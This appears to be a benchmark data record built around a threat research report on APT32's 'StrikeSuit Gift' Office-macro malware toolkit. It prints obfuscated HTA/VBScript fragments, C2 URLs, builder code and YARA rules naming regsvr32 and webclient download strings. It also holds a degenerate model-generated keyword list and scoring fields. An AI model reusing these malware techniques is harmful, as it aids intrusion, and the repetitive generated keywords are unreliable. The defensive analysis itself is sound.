(1502942589)D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\VB\\\\XmlScriptAnalyst\\\\XmlScriptAnalyst\\\\obj\\ \\Debug\\\\XmlScriptAnalyst.pdbde1e7c29d98778fd 7fbb832bd599b3672017-08-17 04:18:44 (1502957924)d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Debu g\\\\Macros_Builder.pdbd4251964e97e7225 8be9cf1acf222bf32017-08-22 00:18:26 (1503375506)d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Reference\\\\WebBuilder\\\\ShellcodeLoader\\\\L\\\\obj\\\\Debu g\\\\L.pdb0f02cf16b466a7bd 2643ef01e09fc6d02017-08-22 00:18:30 (1503375510)d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Reference\\\\WebBuilder\\\\ShellcodeLoader\\\\Test\\\\obj\\\\D ebug\\\\Test.pdb84113138ed90ab30 3a4dd1eedc6a6f192017-08-23 04:44:28 (1503477868)D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\C_Cpp\\\\Binary\\\\Debug\\\\Binary.pdbe2a9f698cb6aa417 bae41ce02d0555da2017-08-23 07:01:51 (1503486111)D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\C_Cpp\\\\ShellcodeThreadCaller\\\\x64\\\\Debug\\\\Sh ellcodeThreadCaller.pdb77374f452700e17f 3fe8c959db3d9f232017-08-23 07:02:11 (1503486131)D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\C_Cpp\\\\ShellcodeThreadCaller\\\\Debug\\\\Shellco deThreadCaller.pdb5104/2022The origin story of APT32 macros THREAT RESEARCH REPORTThreadwork of attribution and assessing connections to APT32 Finally, after tedious inspection of this messy pile of data, we can take stock of our indicators, TTPs, and other pivots and align the StrikeSuit Gift package with public reporting of named threat actors. Attribution is a spectrum, of course, and along the axis of specificity there are different burdens of proof required to make an attribution. In our case, because we are assessing alignment with a large cluster that is not necessarily a real-life \u201cgroup\u201d but more a superset of intrusions that transcend years of activity, a preponderance of evidence will suffice. So, let\u2019s begin with dumping a few of the most qualified data points that show connections to APT32 or OceanLotus.ShellcodeLoader L.dll package is the same hash as that which is mentioned in this RedDrip Team blog about OceanLotus. Beyond being simply the same hash, the StrikeSuit Gift project WebBuilder/ShellcodeLoader has all the technical hallmarks of being the source code for this loader, so that\u2019s nice and convenient for us.ShellcodeLoader project showing TypeLib Id GUID, whichis the same as in theL.dll file THREAT RESEARCH REPORTXML timestamps There are more direct and obvious connections to APT32 (or OceanLotus) in the VB macro and XML scheduled tasks. A quick survey shows that the two XML timestamps observed across multiple projects in the StrikeSuit Gift package  StartBoundary 2016-06-02T11:12:49.4495965 and Date 2016-06-02T11:13:39.1668838) are seen in the macro content of hundreds of malicious documents.5304/2022The origin story of APT32 macros THREAT RESEARCH REPORTMany of these macros designate remote network resources attributed to APT32, OceanLotus, Cobalt Kitty, and so forth.Sample files containing StartBoundary and Date timestamps2016-06-02T11:12:49.4495965 and 2016-06-02T11:13:39.1668838, revealing many overlapswith APT32 and OceanLotus infrastructure.File MD5Example C2 address from macroC2 attribution33adc53121634127 picr.jpgAPT32  Mandiant)e334b21a2c52dcf8 a46990b47dfb4726http[:]//contay.deaftone.com/user/upload/i mg/icon.gif?n=%COMPUTERNAME%APT32  Mandiant)e47554108ef02e9c dc3a034fea1cb943http[:]//job.supperpow.com:80/pd/random1/r andpic/1.jpgAPT32  Mandiant)f87bab14791c3230 b43241500870b109\\\"h\\\"t\\\"t\\\"p://icon.torrentart.com:80/789. jpgAPT32  Mandiant)b7ee7947f9f01790 7f6a175da10a6bf0http[:]//chinanetworkvub.info:80/global/as 15daa274ec269bbehttp[:]//update-flashs.com/gpixel.jpgAPT32  Mandiant)http[:]//google-script.com/adobereg.binCobalt Kitty  CyberReason)e48cc615a4569175 b2ea144928d5b871http[:]//support.chatconnecting.com:80/pub lic/public_pics/rpic.jpgOceanLotus (blevene) Cobalt Kitty  CyberReason)ObfuscationHelper.csTaking a step beyond the comfortable immediacy of indicator links, we can take a gander at TTPs associated with StrikeSuit Gift and APT32 such as obfuscation methods. One of the interesting components of the StrikeSuit Gift package is a piece of source code smartly named ObfuscationHelper. Within the HtaDotnet package, the ObfuscationHelper.cs code does exactly what it sounds like it does, and has a bunch of functions to help provide jacked up strings when building HTA files with obfuscated macros. There are many layers to this onion. The ObfuscationHelper, though, uses arrays of vowels and consonants to build random strings with random casings that appear to be like words. For example, we can use the HtaDotnet project to build an HTA file and we might get code that looks something like this:Snippets of code extracted from a fabricated testHtaDotnet output .hta file.<HTA:APPLICATION iD=\"KONG\" iCON=\"#\" wINDOwstATE='mINiMize' sHOwINtAskbAR='No' /> <script language=\"vbscript\"> on ERror reSume Next HetGhonCosWewShiw=\"ZXUWgQaHQl0qUbK9YHZROhNYn0jYAAEAAAD AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdG VTZXJpYWxpemF0aW9uSG9sZGVyBAAAAAhEZWxlZ2F0ZQd0YXJnZ\"5504/2022The origin story of APT32 macros THREAT RESEARCH REPORTJepZacWimQuungGhun=\"h6m1P3lqH0iwiS0xNaK,wUxEnHR2umtUEJmSvy,fHWQKsadnNWMoLi,4T83Ud8uQOLnzcSqqWAmta 9p5DAABAAAA wEAAAAAAAAABAEAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdG UHdGFyZ2V0MAdtZXRob2\"\u2026 (truncated)FunctIoN QuudKisWhaw ( WhacThes)QuisVesGupYewFong = WhacThes QuisVesGupYewFong =ReplAce ( QuisVesGupYewFong ,\" \" , \"=\")QuisVesGupYewFong= replACE( QuisVesGupYewFong ,\".\" , \"/\") QuisVesGupYewFong = replAce ( QuisVesGupYewFong ,\",\" , \"+\" )QuudKisWhaw= QuisVesGupYewFongENd FunCtIOn\u2026(truncated)fuNCtIOn WhosChem ( YowDon , GongWiwFangLip ,GidRomShos ,CiwHap , KepChinGhop,GinChongYiwQuis)oN eRroR reSume NExTSet ShepWhud = COpquiwwHEnleT ( \"WScript.Shell\" ) ShepWhud.RegRead \"HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\\"+ YowDon+ \"\\\"\u2026An analyst looking at just the HTA file might be quick to hone in on a couple of unique values such as <HTA:APPLICATION iD=\"KONG\", but we can see in our source code that the value KONG is actually generated by the ObfuscationHelper.Code to create the randomized HTA header usingObfuscationHelperhtaAttr = ObfuscationHelper.RandomLowerUpperCase(\"ID=\\\"\" + obs.RandomWords() + \"\\\" icon=\\\"#\\\" />\");The special sauce of ObfuscationHelper begins with three string arrays for vowels and consonants that are later used to build words, which are later checked against a list of special, reserved keywords for the VB macro. We notice that in CONSONANTS_1 there are a couple of duplicates, perhaps a copy/paste error. The vowels will be familiar to most, but how and why are these consonants selected?5604/2022The origin story of APT32 macros THREAT RESEARCH REPORTOn speculation, we may guess that these consonants (and digraph phonemes, representing small pieces of sound in speech) were selected to help fabricate fake strings that appear to be read like or sound like real language words. The selection of vowels and consonants allows the generation of strings with the right construction, though that is highly dependent on the language. For example, when considered phonetically, modern English commonly uses the phoneme \u00f0 (digraph \u201cth\u201d), whereas the phoneme \u0263 (digraph \u201cgh\u201d) is not present. So what does this exact array of consonants imply, and did the developer premeditate the consonants to appear like a particular language? If so, which one? Would Vietnamese be a baseless guess? Or maybe it's random copypasta? Maybe we will never know.ObfuscationHelper declaring the string arraysprivate static readonly string[] VOWELS = new string[] { \"a\", \"e\", \"i\", \"o\", \"u\" }; private static readonly string[] CONSONANTS_1 = new string[] { \"b\", \"c\", \"d\", \"f\", \"g\", \"h\", \"j\", \"k\", \"l\", \"ch\", \"gh\", \"qu\", \"sh\", \"th\", \"wh\", \"m\", \"n\", \"p\", \"q\", \"r\", \"s\", \"t\", \"v\", \"w\", \"x\", \"y\", \"z\", \"ch\", \"gh\", \"qu\", \"sh\", \"th\", \"wh\" }; private static readonly string[] CONSONANTS_2 = new string[] { \"c\", \"d\", \"m\", \"n\", \"p\", \"ng\", \"s\", \"t\", \"w\", \"ng\" };Cloning new arrays forObfuscationHelper()public ObfuscationHelper() {this.m_vowels = CloneStringArray(VOWELS); this.m_consonants_1 = CloneStringArray(CONSONANTS_1); this.m_consonants_2 = CloneStringArray(CONSONANTS_2);}Example of a function using the consonant and vowel arrays to build a randomized word.public string RandomSingleWord(bool autoUpper) {URandom rand = new URandom(); int idx1 = rand.Next(0, this.m_consonants_1.Length); int idx2 = rand.Next(0, this.m_vowels.Length); int idx3 = rand.Next(0, this.m_consonants_2.Length);string s = this.m_consonants_1[idx1]; if (autoUpper) {5704/2022The origin story of APT32 macros THREAT RESEARCH REPORTstring u = s.Substring(0, 1).ToUpper(); s = u + s.Substring(1);} s += this.m_vowels[idx2]; s += this.m_consonants_2[idx3]; return s;}The reason this ObfuscationHelper is pertinent to the discussion is that APT32/OceanLotus clusters are famous for similar obfuscation and encoding, and they are likely using similar techniques still today. In 2018, ESET detailed a piece of malware with a library HTTPprov designed to aid in string generation while (buff < buffEnd){b=genRand(16); if (b[0] - 0x50 > 0x50)t=0;else*buf++= UPPER(vowels[b[1] % 5]);v=consonants[b[1]%21]); if (!t)v=UPPER(v);*buff++= v; if (v!=\u2019h\u2019 && b[2] - 0x50 < 0x50)*buff++= \u2018h\u2019; *buff++= vowels[b[4] % 5];if (b[5] < 0x60)*buff++= vowels[b[6] % 5]; *buff++= consonants[b[7] % 21];if (b[8] < 0x50)*buff++= vowels[b[9] % 5]; *buff++= \u2018-\u2019;}; *buff=\u2019\\0\u2019;In the 2019 OceanLotus report by RedDrip Team, we see this HTA file feel as our HTA test file generated with Obfuscation Helper. This is not surprising, because our5804/2022The origin story of APT32 macros THREAT RESEARCH REPORTShellcodeLoader shows along with this attack as well, but it\u2019s still nice to see all of these tools <script language=\"vbscript\"> on erROR RESUMe NexT \u2026FUNctIon QuangGhut ( BongHim ) set QuangGhut= CreAteobjECT (BongHim ) enD FUnCtIon\u2026FuNCtiOn NingGhac(ThepGhotChudVong,HengThew ,ChedBom ,PitWhiwVeng )SeT DapVen = qUAnggHUt ( \"System.Text.ASCIIEncoding\")sEt MicSotThasGaw = quAnGghuT ( \"System.Security.Cryptography.FromBase64Transform\")SEt QuengZiwGhat = QUANGgHUt ( \"System.IO.MemoryStream\")QuengZiwGhat.Write MicSotThasGaw.TransformFinalBlock ( DapVen.GetBytes_4 (ThepGhotChudVong), 0 , HengThew) , 0 , ChedBomQuengZiwGhat.Position = PitWhiwVengSeT NingGhac = QuengZiwGhat eND fUNCtIonWhen we execute that HTA in a virtual machine, out pops a backdoor, fresh as a newborn fawn. The backdoor makes HTTP POST requests with URIs that appear to contain fake, randomized words likely using some variation of the custom HTTPprov library previously described by ESET.HTTP POST requests with randomized word URIs fromthe backdoor in 2019 OceanLotus HTA file THREAT RESEARCH REPORTA 2019 blog by NSFOCUS examines this exact backdoor and demonstrates the URI generation algorithm generating the vowels and consonants array as aAeiou and aBcdyzfghjklpwr, respectively. This technique by HTTPprov is clearly different from the approach in the ObfuscationHelper project, yet these methods show the developers behind APT32 (and OceanLotus) malware kits wish to provide flexible functionalities that create fake, randomized strings that look almost (but not quite) like real words. This is an important piece of tradecraft because it is something we can study and track as the developers evolve the toolset.6004/2022The origin story of APT32 macros THREAT RESEARCH REPORTNSFOCUS depictions of the URI generation algorithmAPT32 then and now The StrikeSuit Gift package of malware is undoubtedly linked to APT32 based on the ShellcodeLoader and the XML timestamps that draw concrete connections to attributed APT32, OceanLotus, Cobalt Kitty, and other monikers for this rampant threat actor. Looking at the obfuscation and randomization tradecraft from StrikeSuit Gift\u2019s ObfuscationHelper, we can see similarities in other OceanLotus projects such as the HTTPprov library that helps generate fake URIs for backdoor C2 schemas.6104/2022The origin story of APT32 macros THREAT RESEARCH REPORTAPT32 has certainly not been sleeping since 2017. Time marches on and a lot has changed. But what has stayed the same? Instead of looking at the actor\u2019s evolution forward in time, we can take stock of the attacks we see in 2022 and connect the dots back to the puzzle pieces of the past. Netskope Threat Labs detailed a 2022 APT32 operation using MHT lure files and C2 via the legitimate web service Glitch.me. The initial lure documents were shipped in a RAR file. Taking a peek at one of these RARs, we can see the last modified time has modernized to the eight-byte Windows FILETIME, so we know the actor is using WinRAR 5  with defaults for high-precision timestamps, just like the rest of us. Inside of an example RAR file for this campaign, we find an MHT file with a .doc extension, and we see that the document has an Alternate Data Stream ZoneId of 2. It's no coincidence that this is the same approach taken in StrikeSuit Gift\u2019s Macros_Builder.Using PowerShell to tease out the ADS Zone Identifier for 2022 MHT \u2026 FileName : C:\\Users\\user\\Desktop\\HS.doc Stream : Zone.Identifier Length : 24PS C:\\Users\\user\\Desktop> Get-Content C:\\Users\\user\\Desktop\\HS.doc -stream Zone.Identifier[ZoneTransfer] ZoneId=2Routine from 2017Macros_Builder\\Form1.cs to add ADSZone Identifier for input filesprivate void buttonCreate_Click(object sender, EventArgs e) {if (textBoxADS.Text.Trim().Length <= 0)6204/2022The origin story of APT32 macros THREAT RESEARCH REPORT{MessageBox.Show(\"Missing path!\"); return;} string StreamName = \"Zone.Identifier\"; FileInfo ADSFile = new FileInfo(textBoxADS.Text.Trim()); if (ADSFile.AlternateDataStreamExists(StreamName)) {AlternateDataStreamInfo s = ADSFile.GetAlternateDataStream(StreamName,FileMode.Open);s.Delete();} AlternateDataStreamInfo FileADS = ADSFile.GetAlternateDataStream(StreamName,FileMode.OpenOrCreate);using (FileStream TWriter = FileADS.OpenWrite()) {string ZoneTrust = \"[ZoneTransfer]\\r\\nZoneId=2\"; using(StreamWriter FStreamWriter = new StreamWriter(TWriter)) {FStreamWriter.AutoFlush = true; FStreamWriter.Write(ZoneTrust);}}MessageBox.Show(\"Alternative Data Stream OK!\", \"Complete!\", MessageBoxButtons.OK,MessageBoxIcon.Information);}Diving further into Glitch.me campaign samples, in one MHT, we extract and base64 decode the content of Content-Location: file:///C:/604BB24E/DeliveryInformation_files/editdata.mso to arrive at an ActiveMime blob, which we can decode with oledump and then view the VB macro content.C:\\Users\\user\\Desktop>oledump ActiveMime.bin1: 442 'PROJECT' 2: 41 'PROJECTwm' 3: M 13478 'VBA/ThisDocument' 4: 3452 'VBA/_VBA_PROJECT' 5: 633 'VBA/dir'6304/2022The origin story of APT32 macros THREAT RESEARCH REPORTThe modern macro content is annoyingly encoded with randomized function and parameter strings and tedious char evaluations of octal, hex, and decimal added and subtracted together.MA5SIed2hG218yR = Chr((121 - 0o164 + 0x50)) + Chr((143 + 0xD2 - 0xEE)) We can do a quick check of these using Python. First we find and replace all \u201c&0\u201d and \u201c&H\u201d and replace those with 0o and 0x prefixes that are Python friendly. Replace any &s with +s and now we\u2019re cookin with fire. This is the exact approach that researcher Gustavo Palazolo took in this script to help decode the macro strings, but we\u2019re demonstrating it here for extra fun. Next, just test out a couple expressions at the Python CLI.>>> z = \"121 - 0o164 + 0x50\" >>> print(chr(evaluate(z))) U >>> MA5SIed2hG218yR = chr(evaluate(\"121 - 0o164 + 0x50\")) + chr(evaluate(\"143 + 0xD2 - 0xEE\")) + chr(evaluate(\"0xC0 - 0xB3 + 0o130\")) + chr(evaluate(\"147 - 156 + 0o173\")) + chr(evaluate(\"13 + 0x13\")) + chr(evaluate(\"0x48 - 0o222 + 0o213\")) + chr(evaluate(\"0o212 - 0xAF + 0o210\")) + chr(evaluate(\"0x9F + 0xA0 - 220\")) + chr(evaluate(\"0o220 + 88 - 0o171\")) + chr(evaluate(\"113 + 0x4\")) + chr(evaluate(\"170 - 0x8F + 83\")) + chr(evaluate(\"196 - 0x50\")) >>> print(MA5SIed2hG218yR) User AccountNow that we know this works, one might run through and clean up the obfuscated VB into more of a human-readable text and begin to tease out the innards of the macro.Private Sub ePtqP5mQjVHX4H()On Error Resume Next aGJ5m9Jtam95y = \"Microsoft Outlook Sync\" V9sMn9FaY = \"TL284151.doc\" Dim MA5SIed2hG218yR As String MA5SIed2hG218yR = \"User Account\" RCGt2dyOgy5 MA5SIed2hG218yR = MA5SIed2hG218yR + \"Pictures\" E0xI2h2kKxi9ra = \"background.dll\" w2cHY5K1n = \"\\guest.bmp\"6404/2022The origin story of APT32 macros THREAT RESEARCH REPORTyR1QBm2tf10 = ThisDocument.FullName MA5SIed2hG218yR = \"\\Microsoft\\\" + MA5SIed2hG218yR + w2cHY5K1n MA5SIed2hG218yR = Environ(\"AllUsersProfile\") + MA5SIed2hG218yR kMcnWThP5l = Environ(\"AllUsersProfile\") + \"\\\" + aGJ5m9Jtam95y Dim b6Ot02TnO5CCSH8() As String b6Ot02TnO5CCSH8 = Split(kMcnWThP5l, \"\\\") cache = b6Ot02TnO5CCSH8(LBound(b6Ot02TnO5CCSH8)) For PxSn9cV7c = LBound(b6Ot02TnO5CCSH8) + 1 To UBound(b6Ot02TnO5CCSH8)cache = cache + \"\\\" + b6Ot02TnO5CCSH8(PxSn9cV7c) MkDir cacheEven when partially decoded, this payload macro might appear to have little to do with StrikeSuit Gift Macros_Builder source code. But our guess is that if someone analyzes enough of the new APT32 macros, they will see similarities in how the malware developer uses VB to write binary data, perform randomized string generation, or do error handling. It's not unreasonable to imagine that these 2022 MHT and macro payloads were created with heavily modernized versions of the tooling found throughout the StrikeSuit Gift package. The final backdoor from this elaborate 2022 campaign purportedly uses a Windows Scheduled Task for persistence. Some things never change.6504/2022The origin story of APT32 macros THREAT RESEARCH REPORTEpilogue6604/2022The origin story of APT32 macros THREAT RESEARCH REPORTIn our analysis of StrikeSuit Gift, we did a quick and dirty inspection of the source code, we took a gander at the macro builders, and we sifted through the malware and the slew of artifacts that came along with it. We observed the evolutionary timeline of several interdependent code projects and we established connections to the threat actor APT32. Part of the thrill of threat analysis is that most investigations end not with final answers but with new questions. We dusted off this archaic tome of APT32 macros, and through our analysis, we discovered fresh starting points for tracking the threat actor into the future. Intrusion operations come and go, but threat actors are forever. We plan to continue sharing unique analysis to help advance the field of threat intelligence but also to engage and inspire the next generations of threat analysts. We hope that this origin story and expos\u00e9 was informative, or at least a little bit fun. Holler if you\u2019ve got questions, comments, corrections, or something to add; otherwise, see you around the internet.6704/2022The origin story of APT32 macros THREAT RESEARCH REPORTAppendix6804/2022The origin story of APT32 macros THREAT RESEARCH REPORTYARA rules These precise YARA rules may help bubble up files related to APT32 and StrikeSuit Gift.rule APT32_WebBuilder_ShellcodeLoader_L_dll_timestmp {meta:author = \"Stairwell\" ref = \"P17028 - StrikeSuit Gift - Office Macro Type1\\\\Reference\\\\WebBuilder\\\\ShellcodeLoader\\\\Test\\\\bin\\\\Release\\\\L.dll\"condition:pe.timestamp == 1242474426} rule APT32_MacrosBuilder_add_schedule_vba_txt_date {meta:author = \"Stairwell\" ref = \"P17028 - StrikeSuit Gift - Office Macro Type1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\Resources\\\\add_schedule_vba.txt\"strings:$a = \"2016-06-02T11:13:39.1668838\" ascii widecondition:$a} rule APT32_MacrosBuilder_add_schedule_vba_txt_startboundary {meta:author = \"Stairwell\" ref = \"P17028 - StrikeSuit Gift - Office Macro Type1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\Resources\\\\add_schedule_vba.txt\"strings:$a = \"2016-06-02T11:12:49.4495965\" ascii widecondition:$a} rule APT32_MacrosBuilder_add_schedule_vba_txt_regsvr32_to_uri {meta:author = \"Stairwell\" ref = \"P17028 - StrikeSuit Gift - Office Macro Type1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\Resources\\\\add_schedule_vba.txt\"strings:$a = \"\\\"\\\"\\\\\\\"\\\"regsvr32.exe\\\\\\\"\\\" /s /n /u /i:http\"condition:6904/2022The origin story of APT32 macros THREAT RESEARCH REPORT$a} rule APT32_ActiveMime_Lure {meta:ref = \"url\" courtesy_of = \"@Mandiant @TekDefense and @itsreallynick\"strings:$a = \"office_text\" ascii wide $b = \"schtasks /create tn\" nocase ascii wide $c = \"scrobj.dll\" nocase ascii wide $d = \"new-object net.webclient\" ascii wide $e = \"GetUserName\" ascii wide $f = \"WSHnet.UserDomain\" ascii wide $g = \"WSHnet.UserName\" ascii widecondition:4 of them} rule APT32_Macros_Builder_add_schedule_vba_SpawnBase63 {meta:author = \"Stairwell\" ref = \"See HtaDotNetBuilder and HtaDotnet.cs\"strings:$a = \"SpawnBase63\" nocase ascii wide $b = \"SpawnBase63\" base64 base64wide $c = \"SpawnBase63\" xor(0x01-0xff)condition:any of them}These broad YARA rules may help surface or identify files with exported XML scheduled tasks.rule TTP_XML_Scheduled_Task_Date_pcre {meta:author = \"Stairwell\" desc = \"XML Scheduled task strings with a Date that has seven digits of precision, sinceno reasonable human would type that, we can guess that these are likely exported from Windows Task Scheduler.\"strings:$xml = \"<?xml version=\\\"\"7004/2022The origin story of APT32 macros THREAT RESEARCH REPORT$task_xml = \"<Task version=\\\"\" $pcre = /<Date>[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\\.[0-9]{7}<\\/Date>/nocase ascii widecondition:all of them} rule TTP_XML_Scheduled_Task_StartBoundary_pcre {meta:author = \"Stairwell\" desc = \"XML Scheduled task strings with a Date that has seven digits of precision, sinceno reasonable human would type that, we can guess that these are likely exported from Windows Task Scheduler.\"strings:$xml = \"<?xml version=\\\"\" $task_xml = \"<Task version=\\\"\" $pcre =/<StartBoundary>[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\\.[0-9]{7}<\\/StartBoundary>/ nocase ascii widecondition:all of them}VTI queries Malware developers may inadvertently leak source code packages to VirusTotal, and you can find them by searching for odd bundles with artifacts of the development process. Try different artifacts and different packaging types.content:\".csproj\" type:rar positives:1+ fs:2022-04-01+content:\".sln\" type:rar positives:1+ fs:2022-04-01+content:\".suo\" type:rar positives:1+ fs:2022-04-01+content:\".pdb\" type:rar positives:1+ fs:2022-04-01+content:\".pyc\" type:rar positives:1+ fs:2022-04-01+7104/2022The origin story of APT32 macros THREAT RESEARCH REPORT\u201cIndicators\u201d Look, it\u2019s kind of a pain to give all the atomic indicators to you in a way that is easy or sensibly useful. If we print out just MD5s, someone will ask for SHA256s, and if we give SHA256s, someone else will ask for SHA387s. This isn\u2019t the type of report that is really about the indicators anyway, as many of them are so old it doesn't really matter. If you want to take a gander at the StrikeSuit Gift tooling, we provide links below. Jump in and get dirty! Looking at the source code is fun and instructive. If you are an intelligence analyst and trying to play the game of connect the dots for purposes of attribution, we recommend you start with the main StrikeSuit Gift RAR file and do your own hashing and IOC extraction from there. StrikeSuit Gift RAR file See it in MalShare See it in VTLinks and referencesAPT32 by year A selection of APT32 associated reports by year.Year20172018NotesApr 28, Kaspersky   DNS Tunneling May 17, Mandiant   APT32 Cyber Espionage Alive and Well May 24, Cybereason   Operation Cobalt Kitty by OceanLotus Jun 22, Palo Alto Networks   OceanLotus macOS backdoor Nov 11, Volexity   OceanLotus Mass Digital SurveillanceMar 01, ESET   OceanLotus Old techniques, new backdoor Apr 14, Trend Micro   New OceanLotus MacOS Backdoor Oct 10, BlackBerry  Cylance)   Spy RATs of OceanLotus7204/2022The origin story of APT32 macros THREAT RESEARCH REPORT2019202020212022Feb 01, Palo Alto Networks   OceanLotus Downloader KerrDown Mar 20, ESET   Keeping up with OceanLotus decoys Jul 25, NSHC   Growth of Sector F01 Espionage Apr 09, ESET   OceanLotus macOS Malware Update Apr 24, Checkpoint   Deobfuscating APT32 Flow Graphs Jun 20, Qi Anxin   OceanLotus Targets Environmental Group in Vietnam Jul 01, BlackBerry  Cylance)   Ratsnif New Network Vermin from OceanLotus Aug 01, BlackBerry  Cylance)   OceanLotus StenographyApr 22, Mandiant   APT32 Targeting Wuhan and CN Gov on COVID 19 Nov 06, Volexity   OceanLotus Espionage Through Fake Websites Nov 30, Microsoft   BISMUTH Leverages Coinminers to Fly Under RadarFeb 24, Amnesty International   Vietnamese Human Rights Defenders TargetedJan 11, Netskope   Abusing MS Office Using Web Archive Files Jan 20, Qi Anxin   OceanLotus Attack Using Glitch PlatformOffice macros\u25cf url \u25cf url Studio 2022\u25cf url\u25cf url\u25cf Interop Assemblies for Officeurl 20227304/2022The origin story of APT32 macros THREAT RESEARCH REPORTFor more information on the intelligence provided in this report,contact us at threatresearch@stairwell.comStairwell helps organizations take back the cybersecurity high ground with solutions that attackers can't evade. Its flagship product, the Inception platform, empowers security teams to outsmart any attacker. Stairwell is composed of security industry leaders and engineers from Google and is backed by Sequoia Capital, Accel, and Gradient Ventures. stairwell.com7404/2022 ", "generated_text": "research; the StrikeSuit Gift; the origin; 2017; APT32 macros; Vietnam; APT32 exec; its origins; at least 2016; a new research tool; its source code library; the StrikeSuit Gi; analysis; the source code; a repurposed open-source code; open-source; tools; indicators; code reuse; the early Macros; VB macros; techniques; the Malware author; the RAR; the weapon; the ability; timestamps; the macro; indicators; indicators; the code; malicious functions; data; the malware URI; the URI; the original code; the source code; the mister; the URI; the shortcut; VB macro; the command; control; the attacker; a URI; command and control server; code reuse; the remote access server; the C2 server; the host; the C2 server; the C2 server; the C2 server; Windows; other C2 servers; the C2 server; the C2 server; the C2 server; the C2 server; the C2 server; the C2 server; the C2 server;", "ref_text": "<START-1>The report analyzes source code for a malware toolkit called StrikeSuit Gift that appears linked to the threat actor APT32. The code contains Visual Studio solutions for building malicious Office documents with embedded macros. It includes shellcode test files, obfuscation routines, GUI utilities for creating payloads, and more. Analysis of timestamps, developer fingerprints, and code reuse indicates the toolkit was actively developed around 2016-2017. The report explores StrikeSuit Gift's techniques like using VB macros to run PowerShell scripts and scheduled tasks for persistence. Similarities are drawn to APT32 operations before and after 2017. The toolmarks point to Vietnamese developers and testing for compatibility with Vietnam-based antivirus products. The obfuscation code shares techniques with known APT32 malware for generating randomized strings. Embed Office Macros GUI resembles previous APT32 macro builders. The report concludes StrikeSuit Gift provides source code-level insight into APT32's malware development practices. It likely represents an earlier generation of their ongoing toolkit. By exposing the code, the report aims to advance threat intelligence and help defenders understand and mitigate APT32's tactics. <END-1>", "t5/keyword/hint_hit_precision": 0.12698412698412698, "t5/word/hint_hit_recall": 0.06395348837209303, "gpt3/lexical/rouge_rouge1": 0.452054794520548, "gpt3/lexical/rouge_rouge2": 0.09655172413793103, "gpt3/lexical/rouge_rougeL": 0.2191780821917808, "gpt3/lexical/rouge_rougeLsum": 0.2191780821917808, "gpt3_generated_text": ["This research report delves into the origins of APT32 macros, specifically focusing on the malware source code package called StrikeSuit Gift from 2017. APT32, a Vietnam-based threat actor, was known for targeting various entities using custom-developed, open-source, and commercially available tools. The report analyzes the source code library of StrikeSuit Gift, highlighting development conventions, toolmarks, and potential connections to APT32. It also explores indicators of code reuse, malicious functions, and timestamps, providing insight into the techniques and tradecraft of the malware author. Additionally, the report uncovers connections to command and control servers, remote access servers, and other C2 servers used by APT32, shedding light on the attacker's capabilities and tactics."]}, {"split_name": "val", "sample_id": "val_4", "prompt_text": "Extract the keywords: SolutionsServicesPartnersSupportResourcesCompany\ue922\ue922Home\ue93cFireEye Blogs\ue93cThreat Research\ue93cIranian Threat Group Updates Tactics, Techniques a Iranian Threat Group Updates Tactics, Techniques a Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing CampaignMarch 13, 2018 | by Sudeep Singh, Dileep Kumar Jallepalli, Yogesh Londhe, Ben ReadIntroductionFrom January 2018 to March 2018, through FireEye\u2019s Dynamic Threat Intelligence, we observed attackers leveraging the latest code execution and persistence techniques to distribute malicious macro-based documents to individuals in Asia and the Middle East.We attribute this activity to TEMP.Zagros (reported by Palo Alto Networks and Trend Micro as MuddyWater), an Iran-nexus actor that has been active since at least May 2017. This actor has engaged in prolific spear phishing of government and defense entities in Central and Southwest Asia. The spear phishing emails and attached malicious macro documents typically have geopolitical themes. When successfully executed, the malicious documents install a backdoor we track as POWERSTATS.One of the more interesting observations during the analysis of these files was the re-use of the latest AppLocker bypass, and lateral movement techniques for the purpose of indirect code execution. The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system.PDFmyURL converts any url to pdf!substituted with the local machine IP address to achieve code execution on the system.Campaign TimelineIn this campaign, the threat actor\u2019s tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets. A brief timeline of this activity is shown in Figure 1.Figure 1: Timeline of this recently observed spear phishing campaignThe first part of the campaign (From Jan. 23, 2018, to Feb. 26, 2018) used a macro-based document that dropped a VBS file and an INI file. The INI file contains the Base64 encoded PowerShell command, which will be decoded and executed by PowerShell using the command line generated by the VBS file on execution using WScript.exe. The process chain is shown in Figure 2.PDFmyURL converts any url to pdf!Figure 2: Process chain for the first part of the campaignAlthough the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it. One such example of the VBS invoking PowerShell via MSHTA is shown in Figure 3.Figure 3: VBS invoking PowerShell via MSHTAThe second part of the campaign (from Feb. 27, 2018, to March 5, 2018) used a new variant of the macro that does not use VBS for PowerShell code execution. Instead, it uses one of the recently disclosed code execution techniques leveraging INF and SCT files, which we will go on to explain later in the blog.Infection VectorWe believe the infection vector for all of the attacks involved in this campaign are macro-based documents sent as an email attachment. One such email that we were able to obtain was targeting users in Turkey, as shown in Figure 4:PDFmyURL converts any url to pdf!Figure 4: Sample spear phishing email containing macro-based document attachmentThe malicious Microsoft Office attachments that we observed appear to have been specially crafted for individuals in four countries: Turkey, Pakistan, Tajikistan and India. What follows is four examples, and a complete list is available in the Indicators of Compromise section at the end of the blog.Figure 5 